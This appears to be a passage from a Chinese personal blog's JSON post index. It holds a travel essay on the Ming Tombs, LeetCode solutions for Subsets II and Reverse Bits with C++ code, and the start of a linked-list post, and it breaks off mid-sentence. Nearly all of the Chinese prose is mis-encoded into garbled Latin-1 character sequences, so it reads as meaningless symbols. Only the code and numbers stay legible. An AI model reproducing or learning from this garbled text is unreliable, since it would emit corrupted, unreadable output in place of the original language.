ç™¾å¹´çš„é»‘æš—ï¼Œåäººåœ¨è¿™é‡Œæ‰¯ä¸Šäº†ç”µçº¿ï¼Œç‚¹äº®äº†ç”µç¯ï¼Œä¸€åˆ‡æ¸…æ™°å¦‚æ˜¼ï¼Œåœ°å®«ç®—æ˜¯çœŸæ­£åœ°æ˜äº®äº†èµ·æ¥ã€‚\nä»åœ°å®«çš„æ­£é—¨ä¸Šæ˜æ¥¼ï¼Œè¿™æ˜¯ä¸€åº§å®Œå…¨ç”¨çŸ³è´¨ææ–™çš„å»ºç­‘ï¼Œæ•…è€Œæœªå—æˆ˜ç«çš„ä¾µèš€ã€‚ç´«ç¦åŸç”¨æœ¨è´¨ï¼Œé™µå¯æ˜æ¥¼ç”¨çŸ³è´¨ï¼Œä¼¼ä¹ç›¸æ¯”äºæŒ¯å…´æ°‘æ—ã€ä¸æœ½äºå²å†Œï¼Œè¿˜æ˜¯è‡ªå·±é™µå¯çš„ä¸æœ½æ›´ä¸ºé‡è¦ä¸€äº›ã€‚\nåœ¨æ˜æ¥¼è§åˆ°äº†ä¸€å—å·¨å¤§çš„çŸ³ç¢‘ï¼Œç›¸å½“äºæ˜¯å¢“ç¢‘äº†ï¼Œä¸Šä¹¦ï¼šå¤§æ˜ç¥å®—æ˜¾çš‡å¸ä¹‹é™µã€‚åœ¨æ˜æ¥¼ä¸Šï¼Œè§†é‡æå¼€é˜”ï¼Œåœ¨æ­¤å‰æ‰€æåˆ°çš„ç»å¥½å¤©æ°”é‡Œï¼Œæ±Ÿå±±çœŸæ˜¯æ— æ¯”å¤šå¨‡ã€‚æˆ‘æƒ³ï¼Œå¸ç‹æ­»åæœ‰çµï¼Œä»åœ°å®«å‡ºæ¥åœ¨è¿™æ˜æ¥¼ä¸Šçœ‹çœ‹ï¼Œç°ä»Šçš„æ™¯è±¡å¤§æŠµæ˜¯ä¸ä¼šä»¤å…¶å¤±æœ›çš„ã€‚ç„¶è€Œï¼Œäº¦æ˜¯åŒæ ·çš„è§†è§’ï¼Œææ€•ä¹Ÿèƒ½è§åˆ°å†œæ°‘çš„èµ·ä¹‰ã€å¤–å¯‡çš„å…¥ä¾µã€äººæ°‘çš„è‡ªä¸»ã€æ–°ä¸­å›½çš„æ—§è²Œæ–°é¢œã€‚ä¸­å›½äººåœ¨è¿™æ ·çš„å†å²å‘å±•ä¸­ç«™äº†èµ·æ¥ï¼Œè€Œå¹»æƒ³ç€æ±Ÿå±±æ°¸å›ºçš„å¸ç‹ææ€•å°±ä¸ä¼šé‚£ä¹ˆé«˜å…´äº†ã€‚\né•¿é™µ ä»å®šé™µå‡ºæ¥ï¼Œè¿˜å¾—å†ä¹˜åæ¥åˆ†é’Ÿçš„å…¬äº¤è½¦æ‰èƒ½åˆ°è¾¾é•¿é™µã€‚ç›¸è¾ƒäºå®šé™µï¼Œé•¿é™µçš„è§„åˆ¶æ›´ä¸ºå®å¤§ã€‚æˆ˜ç«å¹¶æœªä½¿æ­¤åœ°å—æŸï¼Œæˆ‘ç”±æ­¤å¾—ä»¥è§åˆ°ç¥¾æ©é—¨ã€ç¥¾æ©æ®¿çš„æ ·å­ã€‚\nå¤§æŠµå¯ä»¥å°†ç¥¾æ©é—¨ã€ç¥¾æ©æ®¿çœ‹ä½œæ˜¯å¤ªå’Œé—¨ã€å¤ªå’Œæ®¿ï¼Œæ˜¯çš‡å¸äºå¦ä¸€ä¸ªä¸–ç•Œä¸Šæœçš„åœ°æ–¹ã€‚ç»å…¸çš„é‡æªåº‘æ®¿é¡¶ï¼Œæªè§’ä¹èµ°å…½ï¼Œæ— ä¸€ä¸åœ¨æ˜¾ç¤ºçš‡æƒçš„å¨ä¸¥ã€‚ç¥¾æ©æ®¿ä¸­ç«‹ç€ä¸€åº§å¾ˆé«˜çš„æœ±æ££ååƒï¼Œæ®¿å†…å±•å‡ºçš„æ˜¯å®šé™µå‡ºåœŸçš„æ–‡ç‰©ï¼ˆä»¿å“ï¼‰ï¼Œä¹Ÿæ²¡æœ‰ä»€ä¹ˆå¥½è®²ã€‚æˆ‘åœ¨è¿™é‡Œåˆèå…¥äº†ç¬¬äºŒä¸ªå¯¼æ¸¸å›¢ï¼Œå§‹è§‰å¾—æ¸¸è§ˆæ—¶æœ‰ä¸€ä¸ªå¥½å¯¼æ¸¸æ˜¯èƒ½å­¦åˆ°å¾ˆå¤šçš„ã€‚\nå‡ºç¥¾æ©æ®¿ï¼Œæ¥åˆ°æ£‚æ˜Ÿé—¨å’Œæ˜æ¥¼ã€‚å®šé™µå‘æ˜ä¹‹åæ•ˆæœå¹¶ä¸éå¸¸ç†æƒ³ï¼Œç”±äºé•¿é™µè§„åˆ¶æ›´ä¸ºå®å¤§ï¼Œå›½å®¶ç¦æ­¢äº†å¯¹å¸é™µçš„å‘æ˜ã€‚æ•…é•¿é™µæ²¡æœ‰åœ°å®«å¯ä»¥å‚è§‚ï¼Œæˆ‘ä»¬ä¸Šæ˜æ¥¼ï¼Œåœ¨å¯¼æ¸¸çš„è®²è§£ä¸‹æ‰è§‰å¯Ÿåˆ°æ­¤å¤„çš„ç„å¦™æ‰€åœ¨ã€‚\nä»é•¿é™µæ˜æ¥¼æœ›å»ï¼Œæ­£é¢è¿œå¤„æ˜¯æ˜Œå¹³å‡¤å±±ï¼Œå·¦é¢æ˜¯è½å±±ï¼Œå³é¢æ˜¯è™å³ªï¼Œåé¢æ˜¯ç„æ­¦å±±ï¼›å››è±¡é½èšï¼Œé£æ°´ä¹‹ç¥¥ç‘å¯è§ä¸€æ–‘ã€‚é•¿é™µæ˜¯åä¸‰é™µä¸­çš„ç¥–é™µï¼Œé£æ°´å°¤ä½³ï¼Œé™¤äº†å››è±¡ä¹‹å¤–ï¼Œå¤šå¤„æ°´æµæ±‡é›†äºæ­¤ï¼Œå–ä¼ ç»Ÿçš„â€œæµæ°´èšè´¢â€ä¹‹æ„ã€‚ä¾æ®é£æ°´ï¼Œåè¥¿åŒ—æœä¸œå—æ‰æ˜¯æœ€ä½³çš„å¦ä½ï¼Œé•¿é™µæœå‘åç¦»å—åŒ—ä¹åº¦ï¼Œç´«ç¦åŸæœå‘åç¦»å—åŒ—å…­åº¦ï¼Œçš†å‡ºäºæ­¤ã€‚\nä¸å®šé™µç±»ä¼¼ï¼Œé•¿é™µä¹Ÿæœ‰ä¸€å—çŸ³ç¢‘ï¼Œä¸Šä¹¦ï¼šå¤§æ˜æˆç¥–æ–‡çš‡å¸ä¹‹é™µã€‚â€œæˆç¥–â€æ˜¯åº™å·ï¼Œæœ‰åŠŸç§°ä¸ºç¥–ï¼Œæœ‰å¾·ç§°ä¸ºå®—ï¼ŒåŸæœ¬æœ±æ££çš„åº™å·ä¸ºé«˜å®—ï¼Œåä¸–ä¸€ä½çš‡å¸ï¼ˆè®°ä¸æ¸…äº†ï¼‰è®¤ä¸ºæœ±å…ƒç’‹å¼€åˆ›å¤§æ˜åŸºä¸šæœ‰åŠŸï¼Œè€Œæœ±æ££ç¨³å›ºå¤§æ˜åŸºä¸šæœ‰åŠŸï¼Œäº¦å¯ç§°ä¹‹ä¸ºâ€œç¥–â€ï¼Œäºæ˜¯ï¼Œå¤§æ˜æˆä¸ºå†å²ä¸ŠåŒæ—¶å…·å¤‡â€œæ˜é«˜ç¥–â€å’Œâ€œæ˜æˆç¥–â€ä¸¤ä½ç¥–çš„ç‹æœã€‚\nå½“æ—¶æ”¹å®—ä¸ºç¥–ï¼ŒçŸ³ç¢‘å¹¶æœªé‡æ–°å»ºé€ ï¼Œè€Œæ˜¯åœ¨åŸæœ¬çš„çŸ³ç¢‘ä¹‹å¤–å¥—ä¸Šä¸€å±‚æœ¨è´¨å¤–å£³ã€‚åœ¨å˜‰é–å¹´é—´ï¼Œä¸€é“å¤©é›·å‡»ä¸­æ­¤å¤„ï¼Œæœ¨çŸ³ä¿±æ¯ã€‚çš‡å¸æœ¬èº«ä¹Ÿæ˜¯ä¸€ä½æ— åŠŸæ— å¾·çš„äººï¼Œè®¤ä¸ºæ˜¯ä¸Šå¤©å‘æ€’ï¼Œæ€ªç½ªäºå·±ï¼›æ­¤æ—¶ä¸€ä½å¤§è‡£è¯´ï¼šæ­¤å‰æ”¹å®—ä¸ºç¥–ï¼Œå¹¶æœªé‡ä¿®çŸ³ç¢‘ï¼Œä»Šæ—¥å¤©é›·æ¯ä¹‹ï¼Œä¹ƒæ˜¯ä»¤æˆ‘ä»¬é‡ä¿®çŸ³ç¢‘ä¹‹æ„ï¼Œçš‡å¸å¤§å–œï¼Œé‚é‡ä¿®çŸ³ç¢‘ï¼Œå°±æ˜¯ç°ä»Šçš„è¿™ä¸€å—ã€‚\né•¿é™µçš„çŸ³ç¢‘ç«‹æ­¤ä¹Ÿå‡ ç™¾å¹´äº†ï¼Œæˆ‘å¯¹äºè¿™åº§æ˜æ¥¼çš„æƒ³æ³•ï¼Œä¸å®šé™µæ— å¼‚ã€‚ä»é•¿é™µå‡ºæ¥æ—¶ï¼Œå¯¼æ¸¸è·Ÿæ¸¸å®¢æ‰“è¶£è¯´ï¼šé•¿é™µé£æ°´æœ€ä½³ï¼Œè€Œåé€ä¸ªé€ä¸ªçš„é™µå¯é£æ°´å°±æ¸æ¸å·®äº†ï¼Œæ•…å¤§æ˜å›½åŠ¿ä¹Ÿé€æ¸è¡°å¾®ã€‚æˆ‘æƒ³è¿™ç¡®å®æœ‰è¶£ï¼Œä½†ææ€•æ— ç†ï¼Œå“ªæœ‰ç¥–å®—é™µå¢“ä¸å æ®ä¸Šä½³é£æ°´ï¼Œè€Œå°†ä¹‹ç•™ç»™åä¸–çš„é“ç†å‘¢ï¼Ÿä¸”è‹¥å¦‚æ­¤ï¼Œåˆ™é•¿é™µå ä¸ªé£æ°´æœ€å·®çš„åœ°æ–¹ï¼Œåé¢çš„é™µå¯å»å¯»æ›´å¥½çš„é£æ°´ï¼Œåˆ™å›½è¿æ—¥å¼ºï¼Œç»Ÿæ²»å»¶ç»µï¼›æ¯æœéƒ½å¦‚æ­¤åšï¼Œä¸­å›½å²‚æœ‰å¦‚æ­¤å¤šçš„é£æ°´ä¸Šä½³ä¹‹åœ°ï¼Ÿæœ€ç»ˆææ€•è¿˜æ˜¯ä¸Šå‡åˆ°äº†æé™ï¼Œè¦æ¸æ¸è½ä¸‹çš„ã€‚\nå®é™…ä¸Šæˆ‘æ¥æ•™å¸ç‹é€‰é£æ°´ç½¢ï¼Œä¸–ä¸Šæœ¬æ— ç»ä½³çš„é£æ°´ï¼Œäººæ°‘å°±æ˜¯æœ€å¥½çš„é£æ°´ã€‚\n","date":"2021-04-04T00:00:00Z","permalink":"https://xrg.fj.cn/p/%E6%B8%B8%E6%98%8E%E5%8D%81%E4%B8%89%E9%99%B5%E8%AE%B0/","title":"æ¸¸æ˜åä¸‰é™µè®°"},{"content":"é¢˜ç›®é“¾æ¥ï¼šhttps://leetcode-cn.com/problems/subsets-ii/\né¢˜ç›® ç»™ä½ ä¸€ä¸ªæ•´æ•°æ•°ç»„ nums ï¼Œå…¶ä¸­å¯èƒ½åŒ…å«é‡å¤å…ƒç´ ï¼Œè¯·ä½ è¿”å›è¯¥æ•°ç»„æ‰€æœ‰å¯èƒ½çš„å­é›†ï¼ˆå¹‚é›†ï¼‰ã€‚\nè§£é›† ä¸èƒ½ åŒ…å«é‡å¤çš„å­é›†ã€‚è¿”å›çš„è§£é›†ä¸­ï¼Œå­é›†å¯ä»¥æŒ‰ ä»»æ„é¡ºåº æ’åˆ—ã€‚\nç¤ºä¾‹1\nè¾“å…¥ï¼š nums = [1,2,2]\nè¾“å‡ºï¼š [[],[1],[1,2],[1,2,2],[2],[2,2]]\nç¤ºä¾‹2\nè¾“å…¥ï¼š nums = [0]\nè¾“å‡ºï¼š [[],[0]]\nåˆ†æ ä¸‰ä¸ªæœˆä¹‹å‰WAè¿‡çš„é¢˜ï¼Œåœ¨æ¯æ—¥ä¸€é¢˜é‡Œç¢°è§äº†ï¼Œè€Œæˆ‘è¿˜æ˜¯æ€è€ƒäº†å¾ˆä¹… ğŸ˜¢\nåŸå§‹æ•°ç»„ä¸­å¯èƒ½åŒ…å«é‡å¤å…ƒç´ ï¼Œåˆ™å¯¹äºé‡å¤å…ƒç´ çš„è€ƒè™‘å°±å°¤ä¸ºé‡è¦ï¼Œä¸€èˆ¬æ¥è¯´ï¼Œé‡å¤å…ƒç´ å¯¹äºå­é›†çš„è´¡çŒ®ä¹Ÿæœ‰é‡å¤ã€‚\næˆ‘ä»¬ä¸å¦¨è€ƒè™‘è¿›è¡Œä»¥ä¸‹çš„æ¨¡æ‹Ÿï¼Œå¯¹äºä¸€ä¸ª ä¸åŒ…å«é‡å¤å…ƒç´  çš„é›†åˆ [1, 2, 3] ï¼Œå¦‚ä½•æ±‚å¾—å®ƒçš„æ‰€æœ‰å­é›†å‘¢ï¼Ÿ\né¦–å…ˆï¼Œç­”æ¡ˆä¸­åŒ…å«ä¸€ä¸ªç©ºé›†ã€‚\né¦–å…ˆå–å¾—ç¬¬ä¸€ä¸ªå…ƒç´ ï¼Œå°†å…¶ä¸å½“å‰ç­”æ¡ˆä¸­çš„æ‰€æœ‰é›†åˆæ‹¼æ¥ï¼Œæ”¾å…¥ç­”æ¡ˆä¸­ï¼›\nè€ƒè™‘ç¬¬äºŒä¸ªå…ƒç´ ï¼Œå°†å…¶ä¸å½“å‰ç­”æ¡ˆä¸­çš„æ‰€æœ‰é›†åˆæ‹¼æ¥ï¼Œæ”¾å…¥ç­”æ¡ˆä¸­ï¼›\nç¬¬ä¸‰ä¸ªå…ƒç´ åŒç†ã€‚\nç¤ºæ„ åœ¨è¿™ä¸ªç¯èŠ‚ä¸­ï¼Œç”±äºç­”æ¡ˆæ˜¯åœ¨ä¸æ–­åœ°å¢é•¿çš„ï¼Œæˆ‘ä»¬åªéœ€è¦ç”¨ä¸€ä¸ªå˜é‡ä¿å­˜æ·»åŠ å…ƒç´ ä¹‹å‰çš„ç­”æ¡ˆé›†åˆå¤§å°å³å¯ã€‚\nè¿™ç§åšæ³•çš„æ­£ç¡®æ€§æ˜¯ ä¸ä¼šè¯æ˜ ç†æ‰€å½“ç„¶çš„ã€‚\nå®é™…ä¸Šï¼Œæ ¹æ®è¿™ç§åšæ³•æˆ‘ä»¬å¯ä»¥ACæ‰ LeetCode78. å­é›† ã€‚\n// LeetCode 78 class Solution { public: vector\u0026lt;vector\u0026lt;int\u0026gt;\u0026gt; subsets(vector\u0026lt;int\u0026gt;\u0026amp; nums) { vector\u0026lt;int\u0026gt; tmp; vector\u0026lt;vector\u0026lt;int\u0026gt;\u0026gt; res; res.push_back(tmp); // empty set for (auto n : nums) { int sze = res.size(); for (int i = 0; i \u0026lt; sze; i++) { tmp = res[i]; tmp.push_back(n); res.push_back(tmp); } } return res; } }; é‚£ä¹ˆé—®é¢˜åœ¨äºï¼Œæœ¬é¢˜çš„åŸå§‹æ•°ç»„æ˜¯å¯ä»¥é‡å¤çš„ã€‚\nå¯¹äºé‡å¤æ•°æ®ï¼Œé¦–å…ˆå¯ä»¥è¿›è¡Œä¸€æ³¢æ’åºï¼Œä½¿å¾—æˆ‘ä»¬æ¯”è¾ƒæ–¹ä¾¿åœ°è¿›è¡Œåˆ¤é‡ã€‚\nåœ¨ä¸Šé¢çš„åšæ³•ä¸­ï¼Œé‡å¤æ•°æ®äº§ç”Ÿçš„ç­”æ¡ˆä¼šæœ‰ç›¸å½“ä¸€éƒ¨åˆ†é‡å¤ï¼Œæˆ‘ä»¬è€ƒè™‘é›†åˆ [1, 2, 2] ï¼š\nå¯¹é›†åˆ[1,2,2]è¿›è¡ŒåŒæ ·çš„æ“ä½œ å¯ä»¥çœ‹åˆ°ï¼Œå¯¹äºé‡å¤å‡ºç°çš„ 2 æ¥è¯´ï¼Œå®ƒä¸éœ€è¦å†ä¸ [] å’Œ [1] è¿›è¡Œåˆå¹¶ã€‚\né‚£ä¹ˆï¼Œé‡å¤æ•°æ®åœ¨å“ªé‡Œèƒ½å¤Ÿäº§ç”Ÿè´¡çŒ®å‘¢ï¼Ÿ\nç­”æ¡ˆå°±æ˜¯ ä¸Šä¸€æ­¥æ–°åŠ å…¥çš„å­é›† ï¼\né‡å¤æ•°æ®ä¸ä¸Šä¸€æ­¥åŠ å…¥çš„å­é›†åˆå¹¶ ç”±æ­¤ï¼Œå½¢åŠ¿å°±å˜å¾—æ¯”è¾ƒæ˜æœ—äº†ã€‚å¯¹äºéé‡å¤çš„æ•°æ®ï¼Œä¸ç›®å‰æ‹¥æœ‰çš„æ‰€æœ‰å­é›†è¿›è¡Œåˆå¹¶ï¼›å¯¹äºé‡å¤çš„æ•°æ®ï¼Œåªä¸ä¸Šä¸€æ­¥åŠ å…¥çš„å­é›†è¿›è¡Œåˆå¹¶ã€‚\nå¦‚ä½•åªè·å–ä¸Šä¸€æ­¥åŠ å…¥çš„å­é›†å‘¢ï¼Ÿåœ¨ä¸Šé¢ç»™å‡ºçš„ä»£ç ä¸­ï¼Œæˆ‘ä»¬ä½¿ç”¨ sze æ¥è®°å½•ç­”æ¡ˆé›†åˆä¸­åŸæœ¬çš„å¤§å°ã€‚å¾ˆå·§çš„ï¼Œä¸Šä¸€æ­¥åŠ å…¥çš„å­é›†åœ¨ç­”æ¡ˆé›†åˆä¸­çš„ä¸‹æ ‡å°±ä» sze å¼€å§‹ã€‚\näºæ˜¯ï¼Œä½¿ç”¨ä¸€ä¸ªå˜é‡ start æ¥è®°å½•æœ¬è½®éœ€è¦åˆå¹¶çš„å­é›†èµ·ç‚¹ï¼Œå½“å½“å‰çš„æ•°æ˜¯é‡å¤çš„ï¼Œ start å°±è¢«è®¾ç½®ä¸º sze ï¼Œç„¶åæ›´æ–°æ–°çš„ sze ï¼Œå¦åˆ™ start ç›´æ¥è®¾ç½®ä¸º 0 ã€‚\nACä»£ç  class Solution { public: vector\u0026lt;vector\u0026lt;int\u0026gt;\u0026gt; subsetsWithDup(vector\u0026lt;int\u0026gt;\u0026amp; nums) { vector\u0026lt;vector\u0026lt;int\u0026gt;\u0026gt; res; vector\u0026lt;int\u0026gt; tmp; res.push_back(tmp); int start, sze; sort(nums.begin(), nums.end()); for (int idx = 0; idx \u0026lt; nums.size(); idx++) { if (idx \u0026gt; 0 \u0026amp;\u0026amp; nums[idx] == nums[idx - 1]) { start = sze; } else { start = 0; } sze = res.size(); for (int i = start; i \u0026lt; sze; i++) { tmp = res[i]; tmp.push_back(nums[idx]); res.push_back(tmp); } } return res; } }; Performance å°ç»“ ä¸‰ä¸ªæœˆå‰WAæ‰çš„é¢˜ç›®åœ¨ä»Šå¤©é‡æ–°æ¥åˆ°æˆ‘çš„é¢å‰ï¼Œç»è¿‡ä¸€ç•ªæ€ç´¢ä¹‹åèƒ½å¤Ÿç‹¬ç«‹åœ°å°†å…¶åšå‡ºæ¥äº†ã€‚äººç”Ÿç‚¹æ»´è¿›æ­¥å¤§æŠµçš†è§äºæ­¤ç±»ç»†èŠ‚ä¹‹ä¸­ã€‚é¢˜è§£åŸºæœ¬é‡‡ç”¨å›æº¯çš„åŠæ³•ï¼Œåœ¨æ­¤æ²¡æœ‰èŠ±è´¹ç²¾åŠ›äºˆä»¥ç ”ç©¶ã€‚äº¦å› æ­¤æœ¬æ–‡æ— æ‰€å‚è€ƒï¼Œä¾¿æœ‰ï¼Œä¹Ÿæ˜¯æ­¤ä¸‰æœˆä¸­æ‰€è§çš„æŸç¯‡æ–‡ç« ï¼Œå›å¿†ä¸æ¸…çŸ£ã€‚\n","date":"2021-03-31T00:00:00Z","permalink":"https://xrg.fj.cn/p/%E9%9A%BE%E9%A2%98%E6%9C%AC-leetcode90.-%E5%AD%90%E9%9B%86-ii/","title":"éš¾é¢˜æœ¬ | LeetCode90. å­é›† II"},{"content":"é¢˜ç›®é“¾æ¥ï¼šhttps://leetcode-cn.com/problems/reverse-bits/\nä¸€é“ç®€å•é¢˜ï¼Œå´èƒ½å¼•å‡ºä¸€ä¸ªæ— æ¯”éªšåŒ…çš„æ“ä½œã€‚æ­¤æ³•å‰æ‰€æœªè§ï¼Œç‹¬è‡ªäº¦éš¾æƒ³å‡ºï¼Œå› æ­¤å¤§æŠµä¹Ÿç®—æ˜¯éš¾çš„ã€‚\né¢˜ç›® é¢ å€’ç»™å®šçš„ 32 ä½æ— ç¬¦å·æ•´æ•°çš„äºŒè¿›åˆ¶ä½ã€‚\nç¤ºä¾‹1\nè¾“å…¥ï¼š 00000010100101000001111010011100\nè¾“å‡ºï¼š 00111001011110000010100101000000\nè§£é‡Šï¼š è¾“å…¥çš„äºŒè¿›åˆ¶ä¸² 00000010100101000001111010011100 è¡¨ç¤ºæ— ç¬¦å·æ•´æ•° 43261596ï¼Œ å› æ­¤è¿”å› 964176192ï¼Œå…¶äºŒè¿›åˆ¶è¡¨ç¤ºå½¢å¼ä¸º 00111001011110000010100101000000ã€‚\nç¤ºä¾‹2\nè¾“å…¥ï¼š 11111111111111111111111111111101 è¾“å‡ºï¼š 10111111111111111111111111111111 åˆ†æ æ˜“å¾—ç®€å•æš´åŠ›çš„32æ¬¡å¾ªç¯æ³•ï¼Œåœ¨æ­¤ä¸è¡¨ï¼Œè¯¦è§ACä»£ç 1ã€‚å”¯æœ‰ä¸€ç‚¹å€¼å¾—æ³¨æ„ï¼šå…ˆåŠ æœ€ä½ä½å†å°† res ç§»ä½çš„æ—¶å€™ï¼Œåªèƒ½ç§»åŠ¨ 31 æ¬¡ï¼Œå¦åˆ™æœ€é«˜ä½å°†æº¢å‡ºã€‚å› æ­¤ï¼ŒACä»£ç 1ä¸­åªå–31æ¬¡å¾ªç¯ï¼Œè€Œå°†æœ€åä¸€ä½ç½®äºå¾ªç¯å¤–ã€‚\nå¯¹äºä¸€ä¸ªé¦–å°¾å¯¹æ¢çš„æ“ä½œï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨åˆ†æ²»çš„æ€è·¯ã€‚\nè€ƒè™‘å¯¹äºæœ€å¤§çš„32ä½äºŒè¿›åˆ¶ï¼Œå°†å‰16ä½ä¸å16ä½å¯¹æ¢ã€‚\nè€ƒè™‘é«˜ä½çš„16ä½ï¼Œå°†æ¯ä¸€éƒ¨åˆ†ä¸­çš„é«˜8ä½ä¸ä½8ä½å¯¹æ¢ã€‚\nå¦‚æ­¤è¿›è¡ŒÂ·Â·Â·Â·Â·Â·\nåˆ†æ²» é‚£ä¹ˆï¼Œæˆ‘ä»¬å¦‚ä½•åšåˆ°è¿™ç§å½¢å¼çš„å¯¹æ¢å‘¢ï¼Ÿ\nä¸å¦¨ä»¥8ä½äºŒè¿›åˆ¶ä¸ºä¾‹ï¼Œå¯¹äºä¸€ä¸ªå…«ä½äºŒè¿›åˆ¶æ•° 1011 0011 ï¼Œæˆ‘ä»¬é¦–å…ˆéœ€è¦å°†å…¶é«˜ä½å››ä½è¿›è¡Œå¯¹æ¢ã€‚ç¤ºæ„å¦‚ä¸‹ï¼š\nStep 1 å¯¹äºä¸€ä¸ªäºŒè¿›åˆ¶æ•°ï¼Œæˆ‘ä»¬å¯ä»¥å¾ˆç®€å•åœ°ä½¿ç”¨å¦‚ä¸‹åŠæ³•å–å¾—å®ƒçš„é«˜ä½å››ä½ï¼š\nhighBits = 0x10110011 \u0026amp; 0x11110000 = 0x10110011 \u0026amp; 0xf0\nlowBits = 0x10110011 \u0026amp; 0x00001111 = 0x10110011 \u0026amp; 0x0f\nç„¶åæ ¹æ®å›¾ä¸­æ‰€ç¤ºï¼Œé«˜å››ä½ç§»è‡³ä½å››ä½ï¼Œä½å››ä½ç§»è‡³é«˜å››ä½ï¼Œå³åˆ†åˆ«é‡‡å–å³ç§»å’Œå·¦ç§»çš„åŠæ³•ï¼š\nlowerPart = highBits \u0026gt;\u0026gt; 4\nupperPart = lowBits \u0026lt;\u0026lt; 4\næœ€åä¸€æ­¥å°±éå¸¸ç®€å•äº†ï¼Œä¸¤éƒ¨åˆ†æŒ‰ä½å–æˆ–å³å¯ï¼š\nfinal = lowerPart | upperPart\nå¦‚æ­¤ä¸€æ¥ï¼Œæˆ‘ä»¬å®ç°äº†é«˜ä½å››ä½çš„å¯¹æ¢ã€‚\nç´§æ¥ç€ï¼Œå¯¹äºä¸¤éƒ¨åˆ†4ä½æ¥è¯´ï¼Œæ¯4ä½ä¸­éœ€è¦è¿›è¡Œé«˜ä½äºŒä½çš„å¯¹æ¢ã€‚ç¤ºæ„å¦‚ä¸‹ï¼š\nStep 2 åœ¨è¿™é‡Œï¼Œæˆ‘ä»¬çš„ä¸¤éƒ¨åˆ†åˆ†åˆ«å¯ä»¥è¡¨ç¤ºå¦‚ä¸‹ï¼š\nfinal = higherPart | lowerPart = (origin \u0026amp; 0x33 \u0026lt;\u0026lt; 2) | (origin \u0026amp; 0xcc \u0026gt;\u0026gt; 2)\næœ€åï¼Œåœ¨æ¯ä¸€ä¸ªäºŒä½ä¸­è¿›è¡Œé«˜ä½ä¸€ä½çš„å¯¹æ¢ï¼Œç¤ºæ„å›¾ç•¥ã€‚\n8ä½å¦‚æ­¤è§£å†³ï¼Œ16ä½å½“ç„¶ä¹Ÿå¯ï¼Œ32ä½äº¦ç„¶ã€‚\nACä»£ç 1 class Solution { public: uint32_t reverseBits(uint32_t n) { uint32_t res = 0; // æ³¨æ„æ­¤å¾ªç¯çš„æ¡ä»¶ for (int i = 0; i \u0026lt; 31; i++) { res += (n \u0026amp; 1); res = res \u0026lt;\u0026lt; 1; n = n \u0026gt;\u0026gt; 1; } res += (n \u0026amp; 1); return res; } }; ACä»£ç 2 class Solution { public: uint32_t reverseBits(uint32_t n) { // æ³¨æ„ï¼ç”±äºç§»ä½æ“ä½œçš„ä¼˜å…ˆçº§é«˜äºæŒ‰ä½ä¸ï¼Œéœ€è¦åœ¨ä¸æ“ä½œéƒ¨åˆ†æ·»åŠ æ‹¬å· n = ((n \u0026amp; 0xffff0000) \u0026gt;\u0026gt; 16) | ((n \u0026amp; 0x0000ffff) \u0026lt;\u0026lt; 16); n = ((n \u0026amp; 0xff00ff00) \u0026gt;\u0026gt; 8) | ((n \u0026amp; 0x00ff00ff) \u0026lt;\u0026lt; 8); n = ((n \u0026amp; 0xf0f0f0f0) \u0026gt;\u0026gt; 4) | ((n \u0026amp; 0x0f0f0f0f) \u0026lt;\u0026lt; 4); n = ((n \u0026amp; 0xcccccccc) \u0026gt;\u0026gt; 2) | ((n \u0026amp; 0x33333333) \u0026lt;\u0026lt; 2); n = ((n \u0026amp; 0xaaaaaaaa) \u0026gt;\u0026gt; 1) | ((n \u0026amp; 0x55555555) \u0026lt;\u0026lt; 1); return n; } }; Performance å‚è€ƒèµ„æ–™ [1] è´Ÿé›ªæ˜çƒ›.ã€Œå¾ªç¯ã€ä¸ã€Œåˆ†æ²»ã€è§£æ³•[EB/OL].2021-03-29\nhttps://leetcode-cn.com/problems/reverse-bits/solution/fu-xue-ming-zhu-xun-huan-yu-fen-zhi-jie-hoakf/\n","date":"2021-03-29T00:00:00Z","permalink":"https://xrg.fj.cn/p/%E9%9A%BE%E9%A2%98%E6%9C%AC-leetcode190.-%E9%A2%A0%E5%80%92%E4%BA%8C%E8%BF%9B%E5%88%B6%E4%BD%8D/","title":"éš¾é¢˜æœ¬ | LeetCode190. é¢ å€’äºŒè¿›åˆ¶ä½"},{"content":"é¢˜ç›®é“¾æ¥ï¼šhttps://leetcode-cn.com/problems/remove-duplicates-from-sorted-list-ii/\né¢˜ç›® å­˜åœ¨ä¸€ä¸ªæŒ‰å‡åºæ’åˆ—çš„é“¾è¡¨ï¼Œç»™ä½ è¿™ä¸ªé“¾è¡¨çš„å¤´èŠ‚ç‚¹ head ï¼Œè¯·ä½ åˆ é™¤é“¾è¡¨ä¸­æ‰€æœ‰å­˜åœ¨æ•°å­—é‡å¤æƒ…å†µçš„èŠ‚ç‚¹ï¼Œåªä¿ç•™åŸå§‹é“¾è¡¨ä¸­ æ²¡æœ‰é‡å¤å‡ºç° çš„æ•°å­—ã€‚\nè¿”å›åŒæ ·æŒ‰å‡åºæ’åˆ—çš„ç»“æœé“¾è¡¨ã€‚\nç¤ºä¾‹1\nè¾“å…¥ï¼š head = [1,2,3,3,4,4,5]\nè¾“å‡ºï¼š [1,2,5]\nç¤ºä¾‹2\nè¾“å…¥ï¼š head = [1,1,1,2,3]\nè¾“å‡ºï¼š [2,3]\næ•°æ®èŒƒå›´\né“¾è¡¨ä¸­èŠ‚ç‚¹æ•°ç›®åœ¨èŒƒå›´ [0, 300] å†… -100 \u0026lt;= Node.val \u0026lt;= 100 é¢˜ç›®æ•°æ®ä¿è¯é“¾è¡¨å·²ç»æŒ‰å‡åºæ’åˆ— åˆ†æ åœ¨ æœ‰åº çš„é“¾è¡¨ä¸­å»é‡ï¼Œè¡¨ç¤ºæˆ‘ä»¬ç†è®ºä¸Šåªéœ€è¦è¿›è¡Œä¸€æ¬¡éå†å³å¯ã€‚\nè€Œä¸¤æ¬¡éå†çš„åŠæ³•åˆ™æ›´ä¸ºç®€å•ï¼Œä¹Ÿæ˜¯æœ€åˆæµ®ç°åœ¨æˆ‘è„‘æµ·ä¸­çš„å¿µå¤´ã€‚è€ƒè™‘åˆ°é“¾è¡¨èŠ‚ç‚¹çš„æ•°æ®èŒƒå›´åœ¨ [-100, 100] 